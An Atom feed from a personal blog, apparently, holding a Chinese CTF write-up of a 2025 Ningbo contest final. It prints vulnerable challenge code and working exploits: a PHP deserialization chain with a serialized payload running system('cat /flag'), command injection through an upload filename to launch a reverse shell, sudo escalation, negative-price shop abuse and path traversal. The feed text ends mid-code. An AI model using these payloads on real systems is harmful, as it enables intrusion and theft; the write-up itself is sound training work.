<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dr0n&#39;s blog</title>
  
  <subtitle>人生何处不青山</subtitle>
  <link href="https://www.dr0n.top/atom.xml" rel="self"/>
  
  <link href="https://www.dr0n.top/"/>
  <updated>2025-09-06T12:11:07.113Z</updated>
  <id>https://www.dr0n.top/</id>
  
  <author>
    <name>dr0n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2025宁波市第八届网络安全大赛决赛wp</title>
    <link href="https://www.dr0n.top/posts/310e5a1e/"/>
    <id>https://www.dr0n.top/posts/310e5a1e/</id>
    <published>2025-09-06T09:00:00.000Z</published>
    <updated>2025-09-06T12:11:07.113Z</updated>
    
    <content type="html"><![CDATA[<p>队友太强了，break rank1，fix rank4</p><h1 id="web-easyUpload"><a href="#web-easyUpload" class="headerlink" title="[web] easyUpload"></a>[web] easyUpload</h1><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p>F12检查图片，发现通过<code>/show.php?file=img/1.png</code>来读取</p><p>任意文件读取，flag被ban，读index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Class Dog &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bone</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$meat</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$beef</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$candy</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;meat) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;beef)) &amp;&amp; (<span class="hljs-variable language_">$this</span>-&gt;meat != <span class="hljs-variable language_">$this</span>-&gt;beef)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;candy-&gt;flag;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;bone;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br>CLass mouse &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rice</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>) </span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;rice);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fish;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 处理文件上传</span><br><span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$success</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded_file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$uploadDir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>;<br>        <span class="hljs-variable">$uploadedFile</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadedFile</span>)) &#123;<br>            <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;上传成功！&#x27;</span>;<br>            <span class="hljs-variable">$success</span> = <span class="hljs-literal">true</span>;<br><br>            <span class="hljs-variable">$fileContent</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploadedFile</span>);<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$uploadedFile</span>);<br><br>            @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$fileContent</span>);<br>            <span class="hljs-variable">$fileContent</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>            <span class="hljs-comment">// 设置 session，表示上传成功</span><br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;upload_success&#x27;</span>] = <span class="hljs-literal">true</span>;<br><br>            <span class="hljs-comment">// 重定向，防止刷新页面时重复提交表单</span><br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: &quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;<br>...<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>反序列化，经过一个md5绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 启动 session</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br>Class Dog &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bone</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$meat</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$beef</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$candy</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;meat) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;beef)) &amp;&amp; (<span class="hljs-variable language_">$this</span>-&gt;meat != <span class="hljs-variable language_">$this</span>-&gt;beef)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;candy-&gt;flag;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;bone;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br>CLass mouse &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rice</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>) </span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;rice);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fish;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br><span class="hljs-variable">$a</span>-&gt;fish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br><span class="hljs-variable">$a</span>-&gt;fish-&gt;bone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br><span class="hljs-variable">$a</span>-&gt;fish-&gt;bone-&gt;meat = <span class="hljs-string">&#x27;s878926199a&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;fish-&gt;bone-&gt;beef = <span class="hljs-string">&#x27;s155964671a&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;fish-&gt;bone-&gt;candy = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mouse</span>();<br><span class="hljs-variable">$a</span>-&gt;fish-&gt;bone-&gt;candy-&gt;rice = <span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment"># O:3:&quot;Cat&quot;:1:&#123;s:4:&quot;fish&quot;;O:3:&quot;Dog&quot;:4:&#123;s:4:&quot;bone&quot;;O:3:&quot;Dog&quot;:4:&#123;s:4:&quot;bone&quot;;N;s:4:&quot;meat&quot;;s:11:&quot;s878926199a&quot;;s:4:&quot;beef&quot;;s:11:&quot;s155964671a&quot;;s:5:&quot;candy&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;s:20:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;&#125;s:4:&quot;meat&quot;;N;s:4:&quot;beef&quot;;N;s:5:&quot;candy&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2025/ningbo-9.png"></p><h1 id="web-img2base64"><a href="#web-img2base64" class="headerlink" title="[web] img2base64"></a>[web] img2base64</h1><h2 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h2><blockquote><p>小明打ctf上头了，发什么消息都用编码发送，于是他搭建了一个web服务用来将图片进行base64编码，粗心的小明没有考虑安全问题，你能帮他看看吗?</p></blockquote><p>平台给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, jsonify<br><br>app = Flask(__name__)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads/&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(UPLOAD_FOLDER):<br>    os.makedirs(UPLOAD_FOLDER)<br><br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkname</span>(<span class="hljs-params">filename</span>):<br><br>    ILLEGAL_CHARACTERS = <span class="hljs-string">r&quot;[*=&amp;\&quot;%;&lt;&gt;iashto!@()\&#123;\&#125;\[\]_^`\&#x27;~\\#]&quot;</span><br>    noip = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;\d+\.\d+&quot;</span>)<br>    <span class="hljs-keyword">if</span> re.search(ILLEGAL_CHARACTERS, filename):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filename :<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span>(noip.findall(filename)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_form</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;No file part in the request&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;No file selected&quot;</span>&#125;), <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span>(checkname(file.filename)==<span class="hljs-literal">False</span>):<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Not hacking!&quot;</span>&#125;), <span class="hljs-number">500</span><br>    <span class="hljs-keyword">if</span> file:<br>        file_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)<br>        file.save(file_path)<br>        result = subprocess.run(<span class="hljs-string">f&quot;cat <span class="hljs-subst">&#123;file_path&#125;</span> | base64&quot;</span>, shell=<span class="hljs-literal">True</span>, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>        encoded_string = result.stdout.strip()<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&quot;filename&quot;</span>: file.filename,<br>            <span class="hljs-string">&quot;base64&quot;</span>: encoded_string<br>        &#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>公告有提示反弹shell，那就先把反弹的命令写进文件</p><p><img src="/img/wp/2025/ningbo-10.png"></p><p>代码执行的是<code>cat &#123;file_path&#125; | base64</code></p><p>先通过<code>|</code>截断命令，然后使用<code>$0</code>来执行 cat 输出的内容，也就是反弹shell的命令</p><p><img src="/img/wp/2025/ningbo-11.png"></p><p>监听端口</p><p><img src="/img/wp/2025/ningbo-12.png"></p><p>没权限读flag</p><p><code>sudo -l</code>查看有权限的命令，然后在GTFOBins查sudo语法</p><blockquote><p>还好这题使用了简单的base64，不查也能试出来，但是如果是冷门或者比较复杂的就不行了，<a href="https://github.com/dr0n1/CTF_misc_auto_deploy">https://github.com/dr0n1/CTF_misc_auto_deploy</a> 这个脚本可以在本地部署docker版GTFOBins</p></blockquote><p><img src="/img/wp/2025/ningbo-13.png"></p><h1 id="web-genshop"><a href="#web-genshop" class="headerlink" title="[web] genshop"></a>[web] genshop</h1><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>ssti的模板去掉直接过了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># return render_template_string(f&quot;&lt;h3&gt;&#123;result&#125;&lt;/h3&gt;&quot;)</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&lt;h3&gt;<span class="hljs-subst">&#123;result&#125;</span>&lt;/h3&gt;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="web-Easy-shop"><a href="#web-Easy-shop" class="headerlink" title="[web] Easy_shop"></a>[web] Easy_shop</h1><h2 id="break-2"><a href="#break-2" class="headerlink" title="break"></a>break</h2><p>打开是一个商店购买页面</p><p>将购买金额改成负数，可以增加金钱</p><p><img src="/img/wp/2025/ningbo-14.png"></p><p>购买flag，得到<code>/showflag</code>路由</p><p><img src="/img/wp/2025/ningbo-15.png"></p><p>访问是一个文件读取功能，读取<code>../app.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>;<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br><br><span class="hljs-keyword">let</span> money = <span class="hljs-number">1000</span>;<br><span class="hljs-keyword">const</span> initialMoney = <span class="hljs-number">1000</span>;<br><span class="hljs-keyword">let</span> message = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">const</span> products = [<br>  &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;帽子&#x27;</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">10</span> &#125;,<br>  &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;棒球&#x27;</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">15</span> &#125;,<br>  &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;iphone&#x27;</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">150</span> &#125;,<br>  &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">1500</span> &#125;,<br>];<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/showflag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;readfile&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/readfile&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> fileName = req.<span class="hljs-property">body</span>.<span class="hljs-property">fileName</span>;<br><br>  <span class="hljs-keyword">if</span> (fileName.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;fl&quot;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;你还真读flag啊&#x27;</span>);<br>  &#125;<br>  <span class="hljs-comment">// 读取文件内容</span><br>  fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&quot;/app/public/&quot;</span>+fileName, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error reading the file&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">send</span>(data);<br>    &#125;<br>  &#125;);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; products, money, message &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/buy/:productIndex&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> productIndex = req.<span class="hljs-property">params</span>.<span class="hljs-property">productIndex</span>;<br>  <span class="hljs-keyword">let</span> quantity = req.<span class="hljs-property">query</span>.<span class="hljs-property">quantity</span> || <span class="hljs-number">1</span>; <span class="hljs-comment">// 获取购买数量，默认为1</span><br><br>  <span class="hljs-keyword">if</span> (productIndex === <span class="hljs-string">&#x27;3&#x27;</span>) &#123;<br>    quantity = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(quantity); <span class="hljs-comment">// 取绝对值</span><br>    <span class="hljs-keyword">if</span> (products[productIndex] &amp;&amp; money &gt;= products[productIndex].<span class="hljs-property">price</span> * quantity) &#123;<br>      money -= products[productIndex].<span class="hljs-property">price</span> * quantity;<br>      message = <span class="hljs-string">`购买flag成功啦！给你/showflag这个路由，听说那里面有flag`</span>;<br><br><br>      res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; products, money, message, <span class="hljs-attr">showAlert</span>: <span class="hljs-literal">true</span> &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      message = <span class="hljs-string">&#x27;flag很贵的&#x27;</span>;<br>      res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>    &#125;<br>  &#125;<span 